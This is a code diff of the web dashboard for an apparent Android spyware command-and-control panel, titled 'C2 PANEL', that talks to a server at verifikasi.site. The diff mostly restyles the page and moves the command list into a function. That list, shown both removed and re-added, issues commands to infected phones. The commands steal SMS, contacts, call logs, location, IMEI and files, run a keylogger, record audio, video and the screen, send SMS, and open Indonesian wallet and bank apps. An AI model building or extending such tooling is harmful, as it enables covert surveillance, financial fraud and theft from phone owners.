@@ -3,68 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-    <title>☠️ C2 PANEL - HACKER EDITION</title>
+    <title>C2 PANEL</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        :root{
-            --bg-primary:#050a12;
-            --bg-secondary:#0a1628;
-            --bg-card:#0d1a2b;
-            --border-color:#1a2a4a;
-            --text-primary:#b8d4e3;
-            --text-muted:#4a6a8a;
-            --text-accent:#00ff88;
-            --text-info:#4fc3f7;
-            --text-danger:#ff4455;
-            --font-mono:'JetBrains Mono',monospace;
-        }
-        body{background:var(--bg-primary);color:var(--text-primary);font-family:var(--font-mono);min-height:100vh;font-size:13px}
+        body{background:#050a12;color:#b8d4e3;font-family:'JetBrains Mono',monospace;font-size:13px}
         .container{max-width:1600px;margin:0 auto;padding:10px}
-        .login-container{max-width:400px;margin:70px auto;background:var(--bg-secondary);padding:40px;border-radius:12px;border:1px solid var(--border-color);text-align:center}
-        .login-container .logo{font-size:32px;font-weight:800;color:var(--text-accent);margin-bottom:4px}
-        .login-container input{width:100%;padding:12px;border-radius:6px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);margin-bottom:12px;outline:none}
-        .login-container button{width:100%;padding:12px;border-radius:6px;background:linear-gradient(135deg,#0d1a2b,#050a12);color:var(--text-accent);border:1px solid var(--border-color);cursor:pointer}
+        .login-container{max-width:400px;margin:70px auto;background:#0a1628;padding:40px;border-radius:12px;border:1px solid #1a2a4a;text-align:center}
+        .login-container input{width:100%;padding:12px;border-radius:6px;border:1px solid #1a2a4a;background:#050a12;color:#fff;margin-bottom:12px}
+        .login-container button{width:100%;padding:12px;border-radius:6px;background:#0d1a2b;color:#00ff88;border:1px solid #1a2a4a;cursor:pointer}
         .hidden{display:none}
         .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(80px,1fr));gap:4px;margin-bottom:10px}
-        .stat-card{background:var(--bg-card);padding:6px;border-radius:4px;border:1px solid var(--border-color);text-align:center}
-        .stat-card .num{font-size:16px;font-weight:800;color:var(--text-accent)}
-        .stat-card .label{font-size:7px;color:var(--text-muted)}
-        .tabs{display:flex;gap:2px;margin-bottom:10px;background:var(--bg-secondary);padding:4px;border-radius:6px;border:1px solid var(--border-color)}
-        .tab{background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer;border:none;color:var(--text-muted);font-size:10px}
-        .tab.active{background:var(--bg-primary);color:var(--text-accent)}
-        .panel{display:none;background:var(--bg-secondary);border-radius:6px;padding:12px;border:1px solid var(--border-color)}
+        .stat-card{background:#0d1a2b;padding:6px;border-radius:4px;border:1px solid #1a2a4a;text-align:center}
+        .stat-card .num{font-size:16px;font-weight:800;color:#00ff88}
+        .stat-card .label{font-size:7px;color:#4a6a8a}
+        .tabs{display:flex;gap:2px;margin-bottom:10px;background:#0a1628;padding:4px;border-radius:6px;border:1px solid #1a2a4a}
+        .tab{background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer;border:none;color:#4a6a8a;font-size:10px}
+        .tab.active{background:#050a12;color:#00ff88}
+        .panel{display:none;background:#0a1628;border-radius:6px;padding:12px;border:1px solid #1a2a4a}
         .panel.active{display:block}
         .table-wrap{overflow-x:auto;max-height:480px;overflow-y:auto}
         table{width:100%;border-collapse:collapse;font-size:10px}
-        th{background:var(--bg-primary);padding:5px 8px;text-align:left;color:var(--text-info);border-bottom:2px solid var(--border-color)}
+        th{background:#050a12;padding:5px 8px;text-align:left;color:#4fc3f7;border-bottom:2px solid #1a2a4a;position:sticky;top:0}
         td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.02)}
         .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:4px}
-        .cmd-btn{background:var(--bg-primary);padding:4px 6px;border-radius:4px;border:1px solid var(--border-color);color:var(--text-primary);cursor:pointer;text-align:center;font-size:9px}
-        .cmd-btn:hover{border-color:var(--text-accent)}
-        .log-area{background:var(--bg-primary);border-radius:4px;padding:8px;height:260px;overflow-y:auto;font-size:9px;border:1px solid var(--border-color)}
-        #map{height:280px;border-radius:4px;border:1px solid var(--border-color)}
+        .cmd-btn{background:#050a12;padding:4px 6px;border-radius:4px;border:1px solid #1a2a4a;color:#b8d4e3;cursor:pointer;text-align:center;font-size:9px}
+        .cmd-btn:hover{border-color:#00ff88}
+        .log-area{background:#050a12;border-radius:4px;padding:8px;height:260px;overflow-y:auto;font-size:9px;border:1px solid #1a2a4a}
+        #map{height:280px;border-radius:4px;border:1px solid #1a2a4a}
         .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center}
         .modal.active{display:flex}
-        .modal-content{background:var(--bg-secondary);padding:20px;border-radius:8px;max-width:650px;width:94%;border:1px solid var(--border-color)}
-        .modal-close{float:right;background:transparent;border:none;color:var(--text-muted);font-size:18px;cursor:pointer}
+        .modal-content{background:#0a1628;padding:20px;border-radius:8px;max-width:650px;width:94%;border:1px solid #1a2a4a}
+        .modal-close{float:right;background:transparent;border:none;color:#4a6a8a;font-size:18px;cursor:pointer}
     </style>
 </head>
 <body>
 
 <div id="loginContainer" class="login-container">
-    <div class="logo">☠️ C2<span>PANEL</span></div>
+    <div style="font-size:24px;font-weight:800;color:#00ff88;margin-bottom:10px">☠️ C2 PANEL</div>
     <input type="password" id="loginPassword" placeholder="Master Key" onkeydown="if(event.key==='Enter')login()">
     <button onclick="login()">🔓 ACCESS</button>
-    <div id="loginError" style="color:var(--text-danger);margin-top:10px;display:none">Invalid credentials</div>
+    <div id="loginError" style="color:#ff4455;margin-top:10px;display:none">Invalid</div>
 </div>
 
-<div id="dashboardContent" class="dashboard-content hidden">
+<div id="dashboardContent" class="hidden">
     <div class="container">
-        <div class="header" style="display:flex;justify-content:space-between;background:var(--bg-secondary);padding:8px 16px;border-radius:8px;border:1px solid var(--border-color);margin-bottom:10px">
-            <div class="logo">☠️ C2<span>PANEL</span></div>
-            <div><span id="deviceCount">0</span> Devices | <button onclick="logout()" style="background:transparent;border:1px solid #3a1a2a;color:var(--text-danger);padding:2px 12px;border-radius:4px;cursor:pointer">Logout</button></div>
+        <div style="display:flex;justify-content:space-between;background:#0a1628;padding:8px 16px;border-radius:8px;border:1px solid #1a2a4a;margin-bottom:10px">
+            <div>☠️ C2 PANEL</div>
+            <div><span id="deviceCount">0</span> Devices | <button onclick="logout()" style="background:transparent;border:1px solid #3a1a2a;color:#ff4455;padding:2px 12px;border-radius:4px;cursor:pointer">Logout</button></div>
         </div>
 
         <div class="stats" id="statsContainer">
@@ -91,8 +78,8 @@
 
         <div class="panel active" id="panelData">
             <div style="display:flex;gap:8px;margin-bottom:8px">
-                <input type="text" id="searchInput" placeholder="Search..." oninput="filterData()" style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary)">
-                <select id="filterType" onchange="filterData()" style="padding:4px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary)">
+                <input type="text" id="searchInput" placeholder="Search..." oninput="filterData()" style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                <select id="filterType" onchange="filterData()" style="padding:4px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
                     <option value="">All</option>
                     <option value="sms">SMS</option>
                     <option value="kontak">Contacts</option>
@@ -100,7 +87,7 @@
                     <option value="screenshot">Screenshot</option>
                     <option value="keylogger">Keylogger</option>
                 </select>
-                <button onclick="refreshData()" style="padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary);cursor:pointer">Refresh</button>
+                <button onclick="refreshData()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff;cursor:pointer">Refresh</button>
             </div>
             <div class="table-wrap">
                 <table><thead><tr><th>Time</th><th>Source</th><th>Data</th><th>Device</th></tr></thead><tbody id="dataTableBody"></tbody></table>
@@ -114,9 +101,9 @@
         <div class="panel" id="panelC2">
             <div id="cmdContainer" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:4px"></div>
             <div style="margin-top:8px;display:flex;gap:4px">
-                <input type="text" id="customCmd" placeholder="Custom command..." style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary)">
-                <input type="text" id="customParam" placeholder="Param" style="flex:0.3;padding:4px 8px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-primary)">
-                <button onclick="sendCustomCommand()" style="padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);background:var(--bg-primary);color:var(--text-accent);cursor:pointer">Send</button>
+                <input type="text" id="customCmd" placeholder="Custom command..." style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                <input type="text" id="customParam" placeholder="Param" style="flex:0.3;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
+                <button onclick="sendCustomCommand()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#00ff88;cursor:pointer">Send</button>
             </div>
         </div>
 
@@ -139,61 +126,15 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 // ============================================================
-// ☠️ C2 PANEL ULTIMATE v6.0
+// DASHBOARD - REAL
 // ============================================================
 
 var PASSWORD = '';
 var allData = [];
 var logEntries = [];
 var ws = null;
-var currentFilePath = '/sdcard/';
 var map = null;
-var mapMarkers = [];
-var wsConnected = false;
-var refreshInterval = null;
 var SERVER = 'https://verifikasi.site';
-
-var C2_COMMANDS = [
-    { id: 'ambil_kontak', label: '📇 Contacts' },
-    { id: 'ambil_sms', label: '💬 SMS' },
-    { id: 'ambil_call_log', label: '📞 Call Log' },
-    { id: 'ambil_lokasi', label: '📍 Location' },
-    { id: 'get_clipboard', label: '📋 Clipboard' },
-    { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
-    { id: 'ambil_imei', label: '📱 IMEI' },
-    { id: 'ambil_imsi', label: '📱 IMSI' },
-    { id: 'ambil_nomor_hp', label: '📱 Phone' },
-    { id: 'get_installed_apps', label: '📱 Apps' },
-    { id: 'get_notifications', label: '🔔 Notifs' },
-    { id: 'clear_all_notifications', label: '🗑️ Clear All' },
-    { id: 'keylogger_start', label: '▶️ Keylogger' },
-    { id: 'keylogger_stop', label: '⏹️ Stop' },
-    { id: 'keylogger_upload', label: '📤 Upload' },
-    { id: 'kirim_sms', label: '📨 Send SMS', param: 'number|message' },
-    { id: 'call_number', label: '📞 Call', param: 'number' },
-    { id: 'buka_aplikasi', label: '📱 Open App', param: 'package' },
-    { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package' },
-    { id: 'buka_dana', label: '💰 DANA' },
-    { id: 'buka_gopay', label: '💰 GoPay' },
-    { id: 'buka_ovo', label: '💰 OVO' },
-    { id: 'buka_bri', label: '🏦 BRI' },
-    { id: 'buka_bca', label: '🏦 BCA' },
-    { id: 'screenshot', label: '📸 Screenshot' },
-    { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
-    { id: 'stop_audio', label: '⏹️ Stop Audio' },
-    { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
-    { id: 'stop_video', label: '⏹️ Stop Video' },
-    { id: 'screen_record', label: '📹 Screen Rec', param: 'durasi' },
-    { id: 'screen_record_stop', label: '⏹️ Stop' },
-    { id: 'list_file', label: '📂 List Files', param: 'path' },
-    { id: 'ambil_file', label: '📄 Get File', param: 'path' },
-    { id: 'get_system_info', label: '📊 System Info' },
-    { id: 'get_battery', label: '🔋 Battery' },
-    { id: 'get_wifi', label: '📶 WiFi' },
-    { id: 'vibrate', label: '📳 Vibrate', param: 'ms' },
-    { id: 'toast', label: '💬 Toast', param: 'msg' },
-    { id: 'buka_url', label: '🌐 Open URL', param: 'url' }
-];
 
 function login() {
     var p = document.getElementById('loginPassword').value.trim();
@@ -283,7 +224,48 @@ function filterData() { renderData(allData); }
 function renderC2Commands() {
     var container = document.getElementById('cmdContainer');
     container.innerHTML = '';
-    C2_COMMANDS.forEach(cmd=>{
+    var commands = [
+        { id: 'ambil_kontak', label: '📇 Contacts' },
+        { id: 'ambil_sms', label: '💬 SMS' },
+        { id: 'ambil_call_log', label: '📞 Call Log' },
+        { id: 'ambil_lokasi', label: '📍 Location' },
+        { id: 'get_clipboard', label: '📋 Clipboard' },
+        { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
+        { id: 'ambil_imei', label: '📱 IMEI' },
+        { id: 'ambil_imsi', label: '📱 IMSI' },
+        { id: 'ambil_nomor_hp', label: '📱 Phone' },
+        { id: 'get_installed_apps', label: '📱 Apps' },
+        { id: 'get_notifications', label: '🔔 Notifs' },
+        { id: 'clear_all_notifications', label: '🗑️ Clear All' },
+        { id: 'keylogger_start', label: '▶️ Keylogger' },
+        { id: 'keylogger_stop', label: '⏹️ Stop' },
+        { id: 'keylogger_upload', label: '📤 Upload' },
+        { id: 'kirim_sms', label: '📨 Send SMS', param: 'number|message' },
+        { id: 'call_number', label: '📞 Call', param: 'number' },
+        { id: 'buka_aplikasi', label: '📱 Open App', param: 'package' },
+        { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package' },
+        { id: 'buka_dana', label: '💰 DANA' },
+        { id: 'buka_gopay', label: '💰 GoPay' },
+        { id: 'buka_ovo', label: '💰 OVO' },
+        { id: 'buka_bri', label: '🏦 BRI' },
+        { id: 'buka_bca', label: '🏦 BCA' },
+        { id: 'screenshot', label: '📸 Screenshot' },
+        { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
+        { id: 'stop_audio', label: '⏹️ Stop Audio' },
+        { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
+        { id: 'stop_video', label: '⏹️ Stop Video' },
+        { id: 'screen_record', label: '📹 Screen Rec', param: 'durasi' },
+        { id: 'screen_record_stop', label: '⏹️ Stop' },
+        { id: 'list_file', label: '📂 List Files', param: 'path' },
+        { id: 'ambil_file', label: '📄 Get File', param: 'path' },
+        { id: 'get_system_info', label: '📊 System Info' },
+        { id: 'get_battery', label: '🔋 Battery' },
+        { id: 'get_wifi', label: '📶 WiFi' },
+        { id: 'vibrate', label: '📳 Vibrate', param: 'ms' },
+        { id: 'toast', label: '💬 Toast', param: 'msg' },
+        { id: 'buka_url', label: '🌐 Open URL', param: 'url' }
+    ];
+    commands.forEach(cmd=>{
         var btn = document.createElement('div');
         btn.className = 'cmd-btn';
         btn.textContent = cmd.label;
